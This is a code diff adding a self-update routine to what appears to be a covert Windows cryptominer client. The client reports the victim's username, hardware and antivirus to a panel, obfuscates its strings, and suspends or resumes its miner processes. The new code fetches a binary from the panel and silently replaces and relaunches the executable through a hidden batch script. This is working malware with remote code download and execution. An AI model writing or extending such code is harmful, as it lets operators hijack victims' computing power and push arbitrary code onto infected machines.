@@ -81,6 +81,207 @@ BOOL WINAPI ConsoleHandler(DWORD signal) {
     return FALSE;
 }
 
+// Check for updates from the panel
+bool CheckAndApplyUpdate(const std::string& panelUrl, const std::string& currentVersion) {
+    try {
+        // Extract base panel URL (without the /api/miners/submit part)
+        std::string baseUrl = panelUrl;
+        size_t apiPos = baseUrl.find("/api/");
+        if (apiPos != std::string::npos) {
+            baseUrl = baseUrl.substr(0, apiPos);
+        }
+        
+        // Fetch current version from panel
+        std::string versionUrl = baseUrl + "/api/updates/current";
+        std::string response = fetchJsonFromUrl(StringToLPWSTR(versionUrl), 0);
+        
+        if (response.empty()) {
+#ifdef _DEBUG
+            std::cerr << "[-] Failed to check for updates from: " << versionUrl << std::endl;
+#endif
+            return false;
+        }
+        
+        // Parse JSON response to get version and download URL
+        std::string panelVersion;
+        std::string downloadUrl;
+        
+        // Extract "version" field
+        size_t versionPos = response.find("\"version\":");
+        if (versionPos != std::string::npos) {
+            size_t startQuote = response.find("\"", versionPos + 10);
+            size_t endQuote = response.find("\"", startQuote + 1);
+            if (startQuote != std::string::npos && endQuote != std::string::npos) {
+                panelVersion = response.substr(startQuote + 1, endQuote - startQuote - 1);
+            }
+        }
+        
+        // Extract "download_url" field
+        size_t urlPos = response.find("\"download_url\":");
+        if (urlPos != std::string::npos) {
+            size_t startQuote = response.find("\"", urlPos + 15);
+            size_t endQuote = response.find("\"", startQuote + 1);
+            if (startQuote != std::string::npos && endQuote != std::string::npos) {
+                downloadUrl = response.substr(startQuote + 1, endQuote - startQuote - 1);
+            }
+        }
+        
+        // Check if version is different
+        if (panelVersion.empty() || panelVersion == currentVersion || downloadUrl.empty()) {
+#ifdef _DEBUG
+            std::cout << "[*] No update available. Current: " << currentVersion << ", Server: " << panelVersion << std::endl;
+#endif
+            return false;
+        }
+        
+#ifdef _DEBUG
+        std::cout << "[!] Update available! Current: " << currentVersion << ", Available: " << panelVersion << std::endl;
+        std::cout << "[*] Download URL: " << downloadUrl << std::endl;
+#endif
+        
+        // Build full download URL
+        std::string fullDownloadUrl = baseUrl + downloadUrl;
+        
+        // Download update
+        size_t updateSize = 0;
+        BYTE *updateBuf = downloadBinaryFromUrl(StringToLPWSTR(fullDownloadUrl), updateSize, 0);
+        
+        if (updateSize == 0 || updateBuf == nullptr) {
+            std::cerr << "[-] Downloaded update file is empty or download failed" << std::endl;
+            return false;
+        }
+        
+#ifdef _DEBUG
+        std::cout << "[+] Downloaded update: " << updateSize << " bytes" << std::endl;
+#endif
+        
+        // Get current executable path
+        wchar_t exePath[MAX_PATH] = {0};
+        if (!GetModuleFileNameW(NULL, exePath, MAX_PATH)) {
+            std::cerr << "[-] Failed to get current executable path" << std::endl;
+            free(updateBuf);
+            return false;
+        }
+        
+        // Save update to temporary file
+        wchar_t tempPath[MAX_PATH] = {0};
+        wchar_t tempDir[MAX_PATH] = {0};
+        
+        if (!GetTempPathW(MAX_PATH, tempDir)) {
+            std::cerr << "[-] Failed to get temp directory" << std::endl;
+            free(updateBuf);
+            return false;
+        }
+        
+        if (!GetTempFileNameW(tempDir, L"CM", 0, tempPath)) {
+            std::cerr << "[-] Failed to create temp filename" << std::endl;
+            free(updateBuf);
+            return false;
+        }
+        
+        // Write update to temp file
+        HANDLE tempFile = CreateFileW(tempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (tempFile == INVALID_HANDLE_VALUE) {
+            std::cerr << "[-] Failed to create temp file" << std::endl;
+            free(updateBuf);
+            return false;
+        }
+        
+        DWORD bytesWritten = 0;
+        if (!WriteFile(tempFile, updateBuf, (DWORD)updateSize, &bytesWritten, NULL) || bytesWritten != (DWORD)updateSize) {
+            std::cerr << "[-] Failed to write update to temp file" << std::endl;
+            CloseHandle(tempFile);
+            DeleteFileW(tempPath);
+            free(updateBuf);
+            return false;
+        }
+        CloseHandle(tempFile);
+        free(updateBuf);
+        
+#ifdef _DEBUG
+        std::cout << "[+] Update written to temp file" << std::endl;
+#endif
+        
+        // Create batch script to replace executable
+        wchar_t batchPath[MAX_PATH] = {0};
+        wcscpy_s(batchPath, MAX_PATH, tempPath);
+        size_t len = wcslen(batchPath);
+        if (len >= 4) {
+            wcscpy_s(batchPath + len - 3, 4, L"bat");
+        }
+        
+        // Convert wide char paths to strings for batch file
+        char exePathStr[MAX_PATH] = {0};
+        char tempPathStr[MAX_PATH] = {0};
+        char batchPathStr[MAX_PATH] = {0};
+        
+        WideCharToMultiByte(CP_ACP, 0, exePath, -1, exePathStr, sizeof(exePathStr), NULL, NULL);
+        WideCharToMultiByte(CP_ACP, 0, tempPath, -1, tempPathStr, sizeof(tempPathStr), NULL, NULL);
+        WideCharToMultiByte(CP_ACP, 0, batchPath, -1, batchPathStr, sizeof(batchPathStr), NULL, NULL);
+        
+        // Create batch content
+        std::string batchContent = "@echo off\n";
+        batchContent += "timeout /t 1 /nobreak\n"; // Wait 1 second for process to start exiting
+        batchContent += "taskkill /f /im client.exe 2>nul\n"; // Force kill old executable if still running
+        batchContent += "timeout /t 1 /nobreak\n"; // Wait for kill to complete
+        batchContent += "del /q \"" + std::string(exePathStr) + "\"\n"; // Delete old executable
+        batchContent += "move /y \"" + std::string(tempPathStr) + "\" \"" + std::string(exePathStr) + "\"\n"; // Move new executable
+        batchContent += "start \"\" \"" + std::string(exePathStr) + "\"\n"; // Start updated executable
+        batchContent += "del /q \"%~f0\"\n"; // Delete this batch file
+        
+        // Write batch file
+        HANDLE batchFile = CreateFileW(batchPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (batchFile == INVALID_HANDLE_VALUE) {
+            std::cerr << "[-] Failed to create batch file" << std::endl;
+            DeleteFileW(tempPath);
+            return false;
+        }
+        
+        bytesWritten = 0;
+        if (!WriteFile(batchFile, batchContent.c_str(), (DWORD)batchContent.size(), &bytesWritten, NULL)) {
+            std::cerr << "[-] Failed to write batch file" << std::endl;
+            CloseHandle(batchFile);
+            DeleteFileW(tempPath);
+            DeleteFileW(batchPath);
+            return false;
+        }
+        CloseHandle(batchFile);
+        
+#ifdef _DEBUG
+        std::cout << "[+] Created update batch script" << std::endl;
+#endif
+        
+        // Execute batch file
+        STARTUPINFOW si = {0};
+        PROCESS_INFORMATION pi = {0};
+        si.cb = sizeof(si);
+        
+        std::string cmdLine = std::string("cmd.exe /c ") + std::string(batchPathStr);
+        wchar_t cmdLineWide[512] = {0};
+        MultiByteToWideChar(CP_ACP, 0, cmdLine.c_str(), -1, cmdLineWide, sizeof(cmdLineWide)/sizeof(wchar_t));
+        
+        if (!CreateProcessW(NULL, cmdLineWide, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+            std::cerr << "[-] Failed to execute update batch" << std::endl;
+            DeleteFileW(tempPath);
+            DeleteFileW(batchPath);
+            return false;
+        }
+        
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        
+#ifdef _DEBUG
+        std::cout << "[+] Update batch started, exiting..." << std::endl;
+#endif
+        
+        return true;
+        
+    } catch (const std::exception& e) {
+        std::cerr << "[-] Exception in CheckAndApplyUpdate: " << e.what() << std::endl;
+        return false;
+    }
+}
+
 int main(int argc, char *argv[])
 {
     // Check if another instance is already running
@@ -128,6 +329,9 @@ int main(int argc, char *argv[])
 
     std::string panelUrlsStr = OBFUSCATE_STRING("http://127.0.0.1:8080/api/miners/submit");
     std::string configGetUrlStr = OBFUSCATE_STRING("");
+    
+    // Client version - update this for each release
+    const std::string CLIENT_VERSION = OBFUSCATE_STRING("2.3.0");
     
     // Pre-encrypt common GPU mining argument strings to stay under 16 encryption limit
     const std::string GMINER_ALGO = OBFUSCATE_STRING("--algo ");
@@ -179,7 +383,7 @@ int main(int argc, char *argv[])
 #ifdef _DEBUG
         std::cout << "[*] Fetching configuration from panel..." << std::endl;
 #endif
-        if (!configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, 0.0, 0.0, GetSystemUptimeMinutes())) {
+        if (!configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, CLIENT_VERSION, 0.0, 0.0, GetSystemUptimeMinutes())) {
             std::cerr << "[-] Failed to fetch configuration from all panel URLs. Exiting." << std::endl;
             return 1;
         }
@@ -358,7 +562,20 @@ int main(int argc, char *argv[])
     if (cpuPi) g_cpuMinerProcess = cpuPi->hProcess;
     if (gpuPi) g_gpuMinerProcess = gpuPi->hProcess;
     int checkInCounter = 0;
+    int updateCheckCounter = 0;
     const int CHECK_IN_INTERVAL = 1; // seconds
+    const int UPDATE_CHECK_INTERVAL = 3600; // seconds (1 hour)
+
+    // Check for updates at startup
+#ifdef _DEBUG
+    std::cout << "[*] Checking for client updates at startup..." << std::endl;
+#endif
+    if (CheckAndApplyUpdate(panelUrlsStr, CLIENT_VERSION)) {
+#ifdef _DEBUG
+        std::cout << "[+] Update applied at startup, exiting..." << std::endl;
+#endif
+        return 0;
+    }
 
     while (true)
     {
@@ -390,7 +607,7 @@ int main(int argc, char *argv[])
                     configFetched = configManager.FetchConfigFromUrlWithFallback(configGetUrlStr);
                 } else {
                     // Use POST method for updates
-                    configFetched = configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, cpuHashrate, gpuHashrate, GetSystemUptimeMinutes());
+                    configFetched = configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, CLIENT_VERSION, cpuHashrate, gpuHashrate, GetSystemUptimeMinutes());
                 }
                 
                 if (configFetched) {
@@ -585,6 +802,24 @@ int main(int argc, char *argv[])
                 } else {
                     NtResumeProcess(gpuPi.value().hProcess);
                 }
+            }
+        }
+
+        // Check for client updates (every hour)
+        updateCheckCounter++;
+        if (updateCheckCounter >= UPDATE_CHECK_INTERVAL) {
+            updateCheckCounter = 0;
+#ifdef _DEBUG
+            std::cout << "[*] Checking for client updates..." << std::endl;
+#endif
+            // Check and apply update if available
+            if (CheckAndApplyUpdate(panelUrlsStr, CLIENT_VERSION)) {
+#ifdef _DEBUG
+                std::cout << "[+] Update applied, exiting..." << std::endl;
+#endif
+                // Exit gracefully so the batch script can replace the executable
+                g_shouldExit = true;
+                break;
             }
         }
         
